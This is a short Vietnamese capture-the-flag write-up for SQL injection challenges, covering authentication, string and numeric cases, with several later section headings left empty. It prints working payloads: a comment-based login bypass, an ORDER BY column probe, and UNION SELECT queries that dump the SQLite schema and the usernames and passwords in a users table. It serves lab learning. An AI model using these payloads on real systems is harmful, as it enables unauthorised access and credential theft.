### [SQL Injection - Authentication]()


Ta đơn giản sử dụng payload *username = admin’--* để bypass qua phần password của admin.


Sau đó mở source code để check password, pass cũng chính là flag.




### [SQL injection - String]()

Đầu tiên ta sử dụng 1 payload để server trả về lỗi systax hoặc lỗi gì đó để xác định version của server sql. Trong trường hợp này SQLite3 


Dùng payload như sau để xác định số cột trong database 1’ order by 1-- và tăng dần cho đến khi trả về lỗi. Lần này số cột sẽ là 2.


Ta lấy tên bảng bằng cách truy vấn. Với SQLite3 ta gõ lệnh sau: 
```
1' union select 1,sql from sqlite_master--
```



```
1’ union select username,password FROM users--
```


### [SQL injection - Numeric]()

Ta sử dụng tương tự các payload tương tự như trên để xác định các thành phần cơ bản như trên của server.







```
1 union select 1,2,3--
```


```
1 union select 1,username,password FROM users--
```



### [SQL Injection - Routed]()

### [SQL Injection - File reading]()




### [SQL Injection - Blind]()
